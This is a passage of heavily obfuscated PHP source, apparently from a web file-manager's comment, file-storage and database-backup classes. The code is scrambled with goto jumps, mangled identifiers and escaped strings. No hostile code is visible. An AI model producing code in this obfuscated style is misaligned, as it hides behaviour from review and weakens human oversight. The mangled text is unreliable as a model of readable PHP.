bŠéŠæˆƒî; dÅíÄ–Ü¥é: $E˜êÅåŒ›Ñ = "\x52\111\107\110\124\40\112\117\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\x74\x5f\160\x72\141\x69\163\145\x20\163\164\x61\162\40\x6f\156\x20\x63\157\x6d\x6d\x65\156\x74\56\143\x6f\155\155\x65\x6e\164\111\104\40\75\x20\163\x74\x61\x72\x2e\143\157\155\155\145\156\164\111\104"; $bµùã­¡Ì = $this->alias($E·‡ªÙ†œ¹[341])->where($e¤İÖ—‚¯)->join($E˜êÅåŒ›Ñ, $E·‡ªÙ†œ¹[2139])->count(); $d½Á¥™¢É¡ = array($E·‡ªÙ†œ¹[2140] => $c²¦è÷Šâ‰, $E·‡ªÙ†œ¹[2141] => $bµùã­¡Ì); goto Cæ©ĞŞÑÈ; Cæ©ĞŞÑÈ: return $d½Á¥™¢É¡; goto b»»‡ÂÔÙ†; bŠéŠæˆƒî: $E·‡ªÙ†œ¹ =& $_SERVER[”Ì÷ñ­î¸]; $e¤İÖ—‚¯ = array($E·‡ªÙ†œ¹[521] => $EÂßâ…å, $E·‡ªÙ†œ¹[522] => $DŒñŒê¦à); $c²¦è÷Šâ‰ = $this->where($e¤İÖ—‚¯)->count(); goto dÅíÄ–Ü¥é; b»»‡ÂÔÙ†: } public function listData($b´‚§àİŸ¬) { $BŒ’†éÓó’ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($b´‚§àİŸ¬[$BŒ’†éÓó’[2142]])) { if ($b´‚§àİŸ¬[$BŒ’†éÓó’[2142]]) { $b´‚§àİŸ¬[$BŒ’†éÓó’[2143]] = array($BŒ’†éÓó’[930], intval($b´‚§àİŸ¬[$BŒ’†éÓó’[2142]])); } unset($b´‚§àİŸ¬[$BŒ’†éÓó’[2142]]); } if (isset($b´‚§àİŸ¬[$BŒ’†éÓó’[2144]])) { if ($b´‚§àİŸ¬[$BŒ’†éÓó’[2144]]) { $b´‚§àİŸ¬[$BŒ’†éÓó’[2143]] = array($BŒ’†éÓó’[927], intval($b´‚§àİŸ¬[$BŒ’†éÓó’[2144]])); } unset($b´‚§àİŸ¬[$BŒ’†éÓó’[2144]]); } return $this->_listData($b´‚§àİŸ¬); } private function _listData($c¶ˆä½¨í¡) { $cÍŒˆß÷š =& $_SERVER[”Ì÷ñ­î¸]; $Dœ‡áÂ²õ³ = $this->where($c¶ˆä½¨í¡)->_makeOrder()->selectPage(100); $this->_listAppendParent($Dœ‡áÂ²õ³[$cÍŒˆß÷š[354]]); $this->_listAppendUser($Dœ‡áÂ²õ³[$cÍŒˆß÷š[354]]); $this->_listAppendMeta($Dœ‡áÂ²õ³[$cÍŒˆß÷š[354]]); return $Dœ‡áÂ²õ³; } private function _makeOrder() { $dá·‡Üõ =& $_SERVER[”Ì÷ñ­î¸]; $EÓŸÌÆ´±• = array($dá·‡Üõ[2138], $dá·‡Üõ[2135], $dá·‡Üõ[187]); $bÖÙ–‰öø¢ = Input::get($dá·‡Üõ[407], $dá·‡Üõ[7], $dá·‡Üõ[389], $EÓŸÌÆ´±•); $FÚ‚¸¸Âäé = Input::get($dá·‡Üõ[408], $dá·‡Üõ[7], $dá·‡Üõ[1432], array($dá·‡Üõ[2145], $dá·‡Üõ[405])); $DÂÀ¡³šÙ = $bÖÙ–‰öø¢ . $dá·‡Üõ[50] . $FÚ‚¸¸Âäé; return $this->order($DÂÀ¡³šÙ); } private function _listAppendParent(&$A¾§Ÿµ›æË) { goto BåëÅÈµš; f»Ûœëç¤: if (!$d®Œ½İÍÍ») { return; } $DÙ‘×•ô¬É = $this->where(array($F½¡‚Úêë[2134] => array($F½¡‚Úêë[7], $d®Œ½İÍÍ»)))->select(); $DÙ‘×•ô¬É = array_to_keyvalue($DÙ‘×•ô¬É, $F½¡‚Úêë[2143]); goto Aí×ª¥ôºñ; BåëÅÈµš: $F½¡‚Úêë =& $_SERVER[”Ì÷ñ­î¸]; $d®Œ½İÍÍ» = array_unique(array_to_keyvalue($A¾§Ÿµ›æË, $F½¡‚Úêë[33], $F½¡‚Úêë[2133])); $d®Œ½İÍÍ» = array_remove_value($d®Œ½İÍÍ», $F½¡‚Úêë[468]); goto f»Ûœëç¤; Aí×ª¥ôºñ: foreach ($A¾§Ÿµ›æË as &$fÛâ»¼Ñ’ª) { if (isset($DÙ‘×•ô¬É[$fÛâ»¼Ñ’ª[$F½¡‚Úêë[2133]]])) { $fÛâ»¼Ñ’ª[$F½¡‚Úêë[2146]] = $DÙ‘×•ô¬É[$fÛâ»¼Ñ’ª[$F½¡‚Úêë[2133]]]; } } goto eÃ¬–Ù¹ï; eÃ¬–Ù¹ï: } private function _listAppendUser(&$bÚ˜¾øÜ„¡) { goto Eîó³¡­À§; EåšÌ‡µ: if (count($AŠÂĞÖ¦Ë) == 0) { return; } foreach ($bÚ˜¾øÜ„¡ as $Ešä˜ƒ²¢‹) { if (isset($Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[2146]])) { $AŠÂĞÖ¦Ë[] = $Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[2146]][$d”ÄÚ“ªÔŒ[1439]]; } } $f¶“óÙ‡åÑ = Model($d”ÄÚ“ªÔŒ[477])->userListInfo($AŠÂĞÖ¦Ë); goto dÆ¼ìÅê¹¿; Eîó³¡­À§: $d”ÄÚ“ªÔŒ =& $_SERVER[”Ì÷ñ­î¸]; $AŠÂĞÖ¦Ë = array_unique(array_to_keyvalue($bÚ˜¾øÜ„¡, $d”ÄÚ“ªÔŒ[33], $d”ÄÚ“ªÔŒ[1439])); $AŠÂĞÖ¦Ë = array_remove_value($AŠÂĞÖ¦Ë, $d”ÄÚ“ªÔŒ[468]); goto EåšÌ‡µ; dÆ¼ìÅê¹¿: foreach ($bÚ˜¾øÜ„¡ as &$Ešä˜ƒ²¢‹) { $Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[535]] = $f¶“óÙ‡åÑ[$Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[1439]]]; if (isset($Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[2146]])) { $Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[2146]][$d”ÄÚ“ªÔŒ[535]] = $f¶“óÙ‡åÑ[$Ešä˜ƒ²¢‹[$d”ÄÚ“ªÔŒ[2146]][$d”ÄÚ“ªÔŒ[1439]]]; } } goto FÕÆéššáã; FÕÆéššáã: } private function _listAppendMeta(&$a•Æ§¼¦§Ş) { goto FšèÚ®äî²; e‹È”Áƒ: if (!$Eˆ¯ä‡Ö§…) { return; } foreach ($a•Æ§¼¦§Ş as $EÒ´Òøôƒ”) { if (isset($EÒ´Òøôƒ”[$eØ­èˆ”[2146]])) { $Eˆ¯ä‡Ö§…[] = $EÒ´Òøôƒ”[$eØ­èˆ”[2146]][$eØ­èˆ”[2143]]; } } $C’­óğÑ¦È = $this->metaList($Eˆ¯ä‡Ö§…); goto FÓ«ÔËÜŸ”; FÓ«ÔËÜŸ”: if (!$C’­óğÑ¦È) { return !1; } foreach ($a•Æ§¼¦§Ş as &$EÒ´Òøôƒ”) { $EÒ´Òøôƒ”[$eØ­èˆ”[417]] = $C’­óğÑ¦È[$EÒ´Òøôƒ”[$eØ­èˆ”[2143]]]; if (isset($EÒ´Òøôƒ”[$eØ­èˆ”[2146]])) { $EÒ´Òøôƒ”[$eØ­èˆ”[2146]][$eØ­èˆ”[417]] = $C’­óğÑ¦È[$EÒ´Òøôƒ”[$eØ­èˆ”[2146]][$eØ­èˆ”[2143]]]; } } goto B™ÉÑ¢éß; FšèÚ®äî²: $eØ­èˆ” =& $_SERVER[”Ì÷ñ­î¸]; $Eˆ¯ä‡Ö§… = array_unique(array_to_keyvalue($a•Æ§¼¦§Ş, $eØ­èˆ”[33], $eØ­èˆ”[2143])); $Eˆ¯ä‡Ö§… = array_remove_value($Eˆ¯ä‡Ö§…, $eØ­èˆ”[468]); goto e‹È”Áƒ; B™ÉÑ¢éß: } private function metaList($DÈ–ÔÉÅ¯) { goto eâ‰¢ù‘·; CÏ˜…•Ì: return $f°Õ»íöí£ ? $f°Õ»íöí£ : array(); goto fä¡ŒÀ”°; fš”Ò‚Â˜ï: $f°Õ»íöí£ = Model($aäÁ™ÊèÓì[2147])->where($DµÏå±¶›é)->select(); $f°Õ»íöí£ = array_to_keyvalue_group($f°Õ»íöí£, $aäÁ™ÊèÓì[2143]); foreach ($f°Õ»íöí£ as $D‡ŸàÂ…éÚ => $BÃíï¼¢¿ä) { $fÍÄñµ—Ãé = array(); foreach ($BÃíï¼¢¿ä as $d„öà¢Í¯Ñ) { $fÍÄñµ—Ãé[$d„öà¢Í¯Ñ[$aäÁ™ÊèÓì[89]]] = $d„öà¢Í¯Ñ[$aäÁ™ÊèÓì[359]]; } $f°Õ»íöí£[$D‡ŸàÂ…éÚ] = $fÍÄñµ—Ãé; } goto CÏ˜…•Ì; eâ‰¢ù‘·: $aäÁ™ÊèÓì =& $_SERVER[”Ì÷ñ­î¸]; if (!$DÈ–ÔÉÅ¯) { return array(); } $DµÏå±¶›é = array($aäÁ™ÊèÓì[2143] => array($aäÁ™ÊèÓì[7], $DÈ–ÔÉÅ¯)); goto fš”Ò‚Â˜ï; fä¡ŒÀ”°: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\x6c\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\x65" => "\x69\157\x5f\x66\x69\x6c\145\137\x6d\145\x74\141", "\155\x65\164\141\x46\151\x65\x6c\x64" => "\x66\151\154\145\x49\104"); public function fileInfo($DñÚ……•Åé) { $eã¾³ì™Ë¢ =& $_SERVER[”Ì÷ñ­î¸]; static $dëğÚ‚øˆ  = array(); if (!isset($dëğÚ‚øˆ [$DñÚ……•Åé])) { $f„ˆ…Ûôˆë = $eã¾³ì™Ë¢[2148]; $BòÔ†„ß°Ğ = Model($eã¾³ì™Ë¢[422])->field($f„ˆ…Ûôˆë)->where(array($eã¾³ì™Ë¢[420] => $DñÚ……•Åé))->find(); $dëğÚ‚øˆ [$DñÚ……•Åé] = $BòÔ†„ß°Ğ; } return $dëğÚ‚øˆ [$DñÚ……•Åé]; } public function addFileByContent($B²¤Îöà‹‚ = '', $bóÊ³òè¥¯ = '') { goto AÔ±ç¿ĞÙé; aÅˆó‹¤è: $FÇ‹½ÜŞ„¸ = $EÇÑ¢ÚôÊ . $c¯²í…‹ô[2150] . rand_string(16); file_put_contents($FÇ‹½ÜŞ„¸, $B²¤Îöà‹‚); $dáæÃèö“ = $this->addFile($FÇ‹½ÜŞ„¸, $bóÊ³òè¥¯, !0); goto e óÛÈİ•ª; AÔ±ç¿ĞÙé: $c¯²í…‹ô =& $_SERVER[”Ì÷ñ­î¸]; $EÇÑ¢ÚôÊ = TEMP_PATH . $c¯²í…‹ô[2149]; if (!is_dir($EÇÑ¢ÚôÊ)) { mk_dir($EÇÑ¢ÚôÊ); } goto aÅˆó‹¤è; e óÛÈİ•ª: if (file_exists($FÇ‹½ÜŞ„¸)) { @unlink($FÇ‹½ÜŞ„¸); } return $dáæÃèö“; goto dÆÄĞ¸½Š; dÆÄĞ¸½Š: } public function createFileName($E‰Şôâƒ™ä) { goto fôËñÜ‡‚; fôËñÜ‡‚: $c¬‡”ÕêÑ =& $_SERVER[”Ì÷ñ­î¸]; $FŸï‘‰øÈ = IO::init($c¬‡”ÕêÑ[8]); $b¯ßÜÛÆ® = $this->makeFilePath($E‰Şôâƒ™ä, $FŸï‘‰øÈ); goto aÚ‰ïÃ…ìá; aÚ‰ïÃ…ìá: $Dê‹… ’ğÕ = $FŸï‘‰øÈ->pathFather($b¯ßÜÛÆ®); static $b¹ö¶šµ²ô = false; $d††÷ÉÊ = $c¬‡”ÕêÑ[2151] . md5($Dê‹… ’ğÕ); goto E‚‰ Ëœò; E‚‰ Ëœò: if (!$b¹ö¶šµ²ô && !Cache::get($d††÷ÉÊ)) { $b¹ö¶šµ²ô = !0; $b‘­šÏÏ = IO::mkdir($Dê‹… ’ğÕ); if (!IO::exist($b‘­šÏÏ . $c¬‡”ÕêÑ[2152])) { IO::mkfile($b‘­šÏÏ . $c¬‡”ÕêÑ[2152]); } Cache::set($d††÷ÉÊ, 1, 3600 * 2); } return $b¯ßÜÛÆ®; goto BŒ‚ÙÒÂŒ; BŒ‚ÙÒÂŒ: } public function makeFilePath($b·å˜Öäâ, $b–¨òÎí) { goto F–äŸš°â¤; F–äŸš°â¤: $aŠ¥Ö¦Æ¿õ =& $_SERVER[”Ì÷ñ­î¸]; $c²©ù…‘‚° = Model($aŠ¥Ö¦Æ¿õ[1088])->get($aŠ¥Ö¦Æ¿õ[2153]); $BÒ¦—¯–Æ = KodIO::defaultIO() . date($aŠ¥Ö¦Æ¿õ[2154]); goto D¯§ğ­ßƒˆ; aá‚®£×¨–: switch ($c²©ù…‘‚°) { case $aŠ¥Ö¦Æ¿õ[2156]: $aÁ’øìƒ¢ = $aÁ’øìƒ¢ . $aŠ¥Ö¦Æ¿õ[91] . $b–¨òÎí->ext($b·å˜Öäâ); if ($b–¨òÎí->ext($b·å˜Öäâ) == $aŠ¥Ö¦Æ¿õ[2096]) { $aÁ’øìƒ¢ .= $aŠ¥Ö¦Æ¿õ[2157]; } break; case $aŠ¥Ö¦Æ¿õ[2158]: goto AÒ»š™¼–; AÒ»š™¼–: $cÏĞö—Ã‚Ê = Model($aŠ¥Ö¦Æ¿õ[1088])->get($aŠ¥Ö¦Æ¿õ[1337]); $bùãÂ·«¡‘ = substr(md5($aŠ¥Ö¦Æ¿õ[1916] . $cÏĞö—Ã‚Ê . date($aŠ¥Ö¦Æ¿õ[688])), 0, 8); $BÒ¦—¯–Æ = KodIO::defaultIO() . date($aŠ¥Ö¦Æ¿õ[2159]) . $bùãÂ·«¡‘ . $aŠ¥Ö¦Æ¿õ[8]; goto C¬ÃØ­Ö”…; C¬ÃØ­Ö”…: if ($b–¨òÎí->ext($b·å˜Öäâ) == $aŠ¥Ö¦Æ¿õ[2096]) { $b·å˜Öäâ .= $aŠ¥Ö¦Æ¿õ[2157]; } $FšÚì’‰åí = IO::fileNameAuto($BÒ¦—¯–Æ, $b·å˜Öäâ); $aÁ’øìƒ¢ = $BÒ¦—¯–Æ . $FšÚì’‰åí; goto bõ”æÀÒ“; bõ”æÀÒ“: break; goto Dõ½É£±Şç; Dõ½É£±Şç: case $aŠ¥Ö¦Æ¿õ[2155]: break; default: break; } return $aÁ’øìƒ¢; goto fÛÜÆ™Ñ©¯; D¯§ğ­ßƒˆ: $aÁ’øìƒ¢ = $BÒ¦—¯–Æ . rand_string(5) . short_id(100); $b·å˜Öäâ = str_replace($aŠ¥Ö¦Æ¿õ[8], $aŠ¥Ö¦Æ¿õ[70], KodIO::clear($b·å˜Öäâ)); if (!$b·å˜Öäâ) { $c²©ù…‘‚° = $aŠ¥Ö¦Æ¿õ[2155]; } goto aá‚®£×¨–; fÛÜÆ™Ñ©¯: } public function addFileByRemote($FƒÅééÄÁ‡, $eê“á«ªéŒ, $E…éå¦Êâ = array()) { goto c ¿™¢Ä‰; c ¿™¢Ä‰: $DŸ¹ÙïÕÌ =& $_SERVER[”Ì÷ñ­î¸]; if (!IO::exist($FƒÅééÄÁ‡)) { return !1; } $eëß¯»Ü–ä = $E…éå¦Êâ[$DŸ¹ÙïÕÌ[163]] ? $E…éå¦Êâ[$DŸ¹ÙïÕÌ[163]] : $DŸ¹ÙïÕÌ[33]; goto eïĞ»šá•; Eö˜Ñ Êëô: if ($bŸÒË÷È‹ = $this->addFileCheckExist($f°Œ›îÚ¨Ì[$DŸ¹ÙïÕÌ[164]], $f°Œ›îÚ¨Ì[$DŸ¹ÙïÕÌ[163]], $f°Œ›îÚ¨Ì[$DŸ¹ÙïÕÌ[77]])) { return $bŸÒË÷È‹; } return $this->addFileData($f°Œ›îÚ¨Ì); goto Aö†£ÃŠ§; eïĞ»šá•: $aÂ›ˆÎÚÄŞ = IO::hashMd5($FƒÅééÄÁ‡, $eëß¯»Ü–ä); $f¥÷¬“áöà = KodIO::defaultDriver(); $f°Œ›îÚ¨Ì = array($DŸ¹ÙïÕÌ[520] => IO::size($FƒÅééÄÁ‡), $DŸ¹ÙïÕÌ[2160] => 1, $DŸ¹ÙïÕÌ[386] => $eê“á«ªéŒ, $DŸ¹ÙïÕÌ[737] => $f¥÷¬“áöà[$DŸ¹ÙïÕÌ[367]], $DŸ¹ÙïÕÌ[387] => $FƒÅééÄÁ‡, $DŸ¹ÙïÕÌ[2161] => $E…éå¦Êâ[$DŸ¹ÙïÕÌ[164]] ? $E…éå¦Êâ[$DŸ¹ÙïÕÌ[164]] : IO::hashSimple($FƒÅééÄÁ‡), $DŸ¹ÙïÕÌ[2162] => $aÂ›ˆÎÚÄŞ ? $aÂ›ˆÎÚÄŞ : $eëß¯»Ü–ä); goto Eö˜Ñ Êëô; Aö†£ÃŠ§: } private function addFileData($d‡ÑÃ¾ƒÜ») { $F¨­ÅŒíãø =& $_SERVER[”Ì÷ñ­î¸]; if (!$d‡ÑÃ¾ƒÜ») { return !1; } $d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[77]] = intval($d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[77]]); if (!$d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[77]] && strlen($d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[164]]) > 32) { $d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[77]] = intval(substr($d‡ÑÃ¾ƒÜ»[$F¨­ÅŒíãø[164]], 32)); } $aŒÈˆ‹Î˜¯ = $this->add($d‡ÑÃ¾ƒÜ»); return $this->find($aŒÈˆ‹Î˜¯); } public function addFile($a÷ÊøÍ‹­—, $AßÁ©÷®‹İ, $FùˆîÖ© = false) { $e‡Úñ­¥¬¦ = IO::hashSimple($a÷ÊøÍ‹­—); $aÓ»‰†à„‹ = IO::hashMd5($a÷ÊøÍ‹­—); $bñùóõ­„ = IO::size($a÷ÊøÍ‹­—); if ($Ašîé…Ö¶å = $this->addFileCheckExist($e‡Úñ­¥¬¦, $aÓ»‰†à„‹, $bñùóõ­„)) { return $Ašîé…Ö¶å; } $DÕê”Š¦ª = $this->addFileMake($a÷ÊøÍ‹­—, $bñùóõ­„, $e‡Úñ­¥¬¦, $aÓ»‰†à„‹, $AßÁ©÷®‹İ, $FùˆîÖ©); return $this->addFileData($DÕê”Š¦ª); } public function addFileMake($b’±ŠóÏ†Ö, $Bà»æ‹ÔŞí, $d‚¿ø…Ì ¿, $bà‰Î‹Ù·µ, $bâœ¹ã¯Š², $Dš”¦óÛ‹…) { goto d§ï…¸ªñ†; FßÂŠË±İ½: $fˆßâ©‹ = get_path_this($D®¹Ïöé–); if ($Dš”¦óÛ‹…) { $aİÈÕµÇª¥ = IO::move($b’±ŠóÏ†Ö, $B¤ÍÇÚ©Ô, !1, $fˆßâ©‹); } else { $aİÈÕµÇª¥ = IO::copy($b’±ŠóÏ†Ö, $B¤ÍÇÚ©Ô, !1, $fˆßâ©‹); } if (!$aİÈÕµÇª¥) { return !1; } goto Eæöæ ¢Æ; d§ï…¸ªñ†: $A”‚øŠØ¹ =& $_SERVER[”Ì÷ñ­î¸]; $D®¹Ïöé– = $this->createFileName($bâœ¹ã¯Š²); $B¤ÍÇÚ©Ô = get_path_father($D®¹Ïöé–); goto FßÂŠË±İ½; Eæöæ ¢Æ: $cæ«¾Âàèé = KodIO::defaultDriver(); $a‚†ØëË×É = array($A”‚øŠØ¹[520] => $Bà»æ‹ÔŞí, $A”‚øŠØ¹[2160] => 1, $A”‚øŠØ¹[386] => $bâœ¹ã¯Š², $A”‚øŠØ¹[737] => $cæ«¾Âàèé[$A”‚øŠØ¹[367]], $A”‚øŠØ¹[387] => $D®¹Ïöé–, $A”‚øŠØ¹[2161] => $d‚¿ø…Ì ¿, $A”‚øŠØ¹[2162] => $bà‰Î‹Ù·µ); return $a‚†ØëË×É; goto cŞ—î™š†ˆ; cŞ—î™š†ˆ: } public function addFileCheckExist($e«Ş–éÍ™æ, $E’•Û§ÏÑ—, $b§ñ’±ªŒ¥) { $aëø‡¶…Ç =& $_SERVER[”Ì÷ñ­î¸]; $f§Ôô…­Ñ = $this->findByHash($e«Ş–éÍ™æ, $E’•Û§ÏÑ—); if (!$f§Ôô…­Ñ) { return !1; } $cùíõäÕÙÏ = array($aëø‡¶…Ç[2160] => intval($f§Ôô…­Ñ[$aëø‡¶…Ç[2163]]) + 1, $aëø‡¶…Ç[520] => $b§ñ’±ªŒ¥); $this->where(array($aëø‡¶…Ç[420] => $f§Ôô…­Ñ[$aëø‡¶…Ç[419]]))->save($cùíõäÕÙÏ); return $f§Ôô…­Ñ; } public function remove($f¡²áˆíêÙ) { $this->linkCountChange($f¡²áˆíêÙ, !1); $this->clearEmpty(); return !0; } public function linkAdd($F³Ô‡ÚˆÇÊ) { $this->linkCountChange($F³Ô‡ÚˆÇÊ, !0); } public function linkCountChange($e‘©™¯»ã©, $eªÃÙğñŒ¬) { goto C–’šŒè‡¦; e½ç˜—¸¶œ: $EæíØŸºÀê = array(); foreach ($e‘©™¯»ã© as $c¯À«øæŠŞ) { $CÑ“ì‘õ¸ˆ = $c¯À«øæŠŞ . $aÖ÷…¡”šÌ[33]; if (!$EæíØŸºÀê[$CÑ“ì‘õ¸ˆ]) { $EæíØŸºÀê[$CÑ“ì‘õ¸ˆ] = 0; } $EæíØŸºÀê[$CÑ“ì‘õ¸ˆ]++; } $e¿˜¬êÆÁÄ = array(); goto eËèî¡ ø; C–’šŒè‡¦: $aÖ÷…¡”šÌ =& $_SERVER[”Ì÷ñ­î¸]; if (!$e‘©™¯»ã©) { return; } if (!is_array($e‘©™¯»ã©)) { $e‘©™¯»ã© = array($e‘©™¯»ã©); } goto e½ç˜—¸¶œ; eËèî¡ ø: foreach ($EæíØŸºÀê as $c¯À«øæŠŞ => $f™¨­ÍŞì¯) { $CÑ“ì‘õ¸ˆ = $f™¨­ÍŞì¯ . $aÖ÷…¡”šÌ[33]; if (!$e¿˜¬êÆÁÄ[$CÑ“ì‘õ¸ˆ]) { $e¿˜¬êÆÁÄ[$CÑ“ì‘õ¸ˆ] = array(); } $e¿˜¬êÆÁÄ[$CÑ“ì‘õ¸ˆ][] = $c¯À«øæŠŞ; } foreach ($e¿˜¬êÆÁÄ as $f™¨­ÍŞì¯ => $aˆõ…¹ñ) { if (!$aˆõ…¹ñ) { continue; } $f™¨­ÍŞì¯ = $eªÃÙğñŒ¬ ? $f™¨­ÍŞì¯ : -intval($f™¨­ÍŞì¯); $C¨…ãäÕï = array($aÖ÷…¡”šÌ[419] => array($aÖ÷…¡”šÌ[7], $aˆõ…¹ñ)); if ($f™¨­ÍŞì¯ < 0) { $C¨…ãäÕï[$aÖ÷…¡”šÌ[2163]] = array($aÖ÷…¡”šÌ[931], abs($f™¨­ÍŞì¯)); } $this->where($C¨…ãäÕï)->setAdd($aÖ÷…¡”šÌ[2163], $f™¨­ÍŞì¯); } goto CãºŸ‘Â…±; CãºŸ‘Â…±: } public function findByHash($dÖÎ°¥°¶½, $b¯ÒÆŒ÷¢ = false) { $fÔš½±Ç =& $_SERVER[”Ì÷ñ­î¸]; if (!$dÖÎ°¥°¶½ && !$b¯ÒÆŒ÷¢) { return !1; } $AÁ•ÇËÍ = array($fÔš½±Ç[2161] => $dÖÎ°¥°¶½); if ($b¯ÒÆŒ÷¢) { $AÁ•ÇËÍ = array($fÔš½±Ç[2162] => $b¯ÒÆŒ÷¢); } return $this->order($fÔš½±Ç[2164])->where($AÁ•ÇËÍ)->find(); } public function clearEmpty($E”Öšç—Áó = 0) { goto CÛâ‡õìç; CÛâ‡õìç: $eêÆ—ìµö =& $_SERVER[”Ì÷ñ­î¸]; $A©”´‰Äç» = time() - 3600 * 24 * $E”Öšç—Áó; $Eê…Ê²â™— = $eêÆ—ìµö[2165] . $A©”´‰Äç»; goto bÌÄÍ¬¤£; Dƒ†°—‘Û…: foreach ($Dö¤ŸÛ‘™Œ as $AŸ…•ê­†Ä) { $B×ô—ÁÑˆç->update(1); $this->resetFile($AŸ…•ê­†Ä); } $B×ô—ÁÑˆç->end(); goto DêÁÚÓùÆ®; bÌÄÍ¬¤£: $Dö¤ŸÛ‘™Œ = $this->where($Eê…Ê²â™—)->select(); if (!$Dö¤ŸÛ‘™Œ) { return; } $B×ô—ÁÑˆç = new Task($eêÆ—ìµö[2166], $eêÆ—ìµö[33], count($Dö¤ŸÛ‘™Œ)); goto Dƒ†°—‘Û…; DêÁÚÓùÆ®: } private function resetFile($Bçå§÷î) { goto D‘½”ß£â; DÉ…ë­Ù†÷: if ($Bçå§÷î[$D¸À×˜™•½[2163]] != $f£ªçïÇƒ) { $this->where($Dëä Šó—)->save(array($D¸À×˜™•½[2160] => $f£ªçïÇƒ)); } goto Dˆ¶ÖÔù½É; D‘½”ß£â: $D¸À×˜™•½ =& $_SERVER[”Ì÷ñ­î¸]; $Dëä Šó— = array($D¸À×˜™•½[420] => $Bçå§÷î[$D¸À×˜™•½[419]]); $cé‡Âáƒ÷† = Model($D¸À×˜™•½[1117])->where($Dëä Šó—)->count(); goto AÄ©¥äÅãÛ; AÄ©¥äÅãÛ: $cêÔÚÁóÍ = Model($D¸À×˜™•½[2167])->where($Dëä Šó—)->count(); $f£ªçïÇƒ = intval($cé‡Âáƒ÷†) + intval($cêÔÚÁóÍ); if ($f£ªçïÇƒ == 0) { IO::remove($Bçå§÷î[$D¸À×˜™•½[75]]); $this->where($Dëä Šó—)->delete(); $this->metaSet($Bçå§÷î[$D¸À×˜™•½[419]], null, null); return; } goto DÉ…ë­Ù†÷; Dˆ¶ÖÔù½É: } public function storageInfo($E¡İç¿¦¹ = false) { goto AŞÆŸÖ«Ò”; cò›­ğØÛ¾: for ($c‚ç˜ÓŒÇÃ = 0; $c‚ç˜ÓŒÇÃ < $A”ø—ŒˆîÙ; $c‚ç˜ÓŒÇÃ = $c‚ç˜ÓŒÇÃ + $e–øÜ‚ŞéŒ) { $a©„ŒïÔ = $this->limit($c‚ç˜ÓŒÇÃ, $c‚ç˜ÓŒÇÃ + $e–øÜ‚ŞéŒ)->select(); foreach ($a©„ŒïÔ as $e¼‹äˆ³È) { $DÒŞ¬êÁ»™ += $e¼‹äˆ³È[$BŠºµ›ò¯é[77]] * $e¼‹äˆ³È[$BŠºµ›ò¯é[2163]]; $DìŞÕÃ¢Ò += $e¼‹äˆ³È[$BŠºµ›ò¯é[77]] * ($e¼‹äˆ³È[$BŠºµ›ò¯é[2163]] - 1); $EëêöéÌ’ += $e¼‹äˆ³È[$BŠºµ›ò¯é[2163]]; } } $D±É•ğ”Æì = array($BŠºµ›ò¯é[2168] => $DÒŞ¬êÁ»™, $BŠºµ›ò¯é[2169] => $DìŞÕÃ¢Ò, $BŠºµ›ò¯é[2170] => $DìŞÕÃ¢Ò / $DÒŞ¬êÁ»™, $BŠºµ›ò¯é[81] => $A”ø—ŒˆîÙ, $BŠºµ›ò¯é[2171] => $EëêöéÌ’); return $D±É•ğ”Æì; goto EìÇ–…¾„¥; AŞÆŸÖ«Ò”: $BŠºµ›ò¯é =& $_SERVER[”Ì÷ñ­î¸]; $A”ø—ŒˆîÙ = $this->count() + 0.0; $DìŞÕÃ¢Ò = 0; goto b­Â¥•µ«í; b­Â¥•µ«í: $DÒŞ¬êÁ»™ = 1; $EëêöéÌ’ = 0; $e–øÜ‚ŞéŒ = 5000; goto cò›­ğØÛ¾; EìÇ–…¾„¥: } } goto e‘æÆº‚•ê; dŒÂ‚­ÔÎ¤: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto c¿’‘ªë–ß; f£ÜŒ©¡Ê­: foreach ($a·õÉÌé³æ as $C§’Šêï·Š) { $E™¢ã¢âË… = $F™‰†ÉˆÌ® . $C§’Šêï·Š . $eá‡ÄÖ‰·õ[719]; $aÂ½¡÷½é‹ = null; if ($C§’Šêï·Š == $eá‡ÄÖ‰·õ[720] && (!isset($BŸó­¦Î¢[$eá‡ÄÖ‰·õ[693]]) || $BŸó­¦Î¢[$eá‡ÄÖ‰·õ[693]] == $eá‡ÄÖ‰·õ[468])) { $aÂ½¡÷½é‹ = self::$io; } $fìÄÖÇóøØ += $C¯Ê¶·å¸Ë->sqlFromDb($C§’Šêï·Š, $E™¢ã¢âË…, $cØãÓ´£ëŒ, $aÂ½¡÷½é‹); } $cØãÓ´£ëŒ->end(); $Cò›³‹…ƒš = array($eá‡ÄÖ‰·õ[721] => $c½¨¡Õ™´µ, $eá‡ÄÖ‰·õ[708] => 1, $eá‡ÄÖ‰·õ[722] => $fìÄÖÇóøØ, $eá‡ÄÖ‰·õ[723] => $fìÄÖÇóøØ); goto b…×ïãÇç°; b…×ïãÇç°: Backup::set($Cò›³‹…ƒš); return !0; goto C‘¸ƒßÃ¡¯; AÒšŠ³¯Ô: mk_dir($F™‰†ÉˆÌ®); $EÌÏö¹Öµ = $fìÄÖÇóøØ = 0; $a·õÉÌé³æ = $C¯Ê¶·å¸Ë->db()->getTables(); goto B¡İ¢¬†…·; céëŒÓª°Ì: $C¯Ê¶·å¸Ë = new DbManage($b‡®äÄÈˆ, $c½¨¡Õ™´µ); $F™‰†ÉˆÌ® = TEMP_FILES . $eá‡ÄÖ‰·õ[711] . self::$name . $eá‡ÄÖ‰·õ[8]; del_dir($F™‰†ÉˆÌ®); goto AÒšŠ³¯Ô; E¸ÚˆĞÂšé: self::$name = $BŸó­¦Î¢[$eá‡ÄÖ‰·õ[28]]; $b‡®äÄÈˆ = $GLOBALS[$eá‡ÄÖ‰·õ[6]][$eá‡ÄÖ‰·õ[17]]; 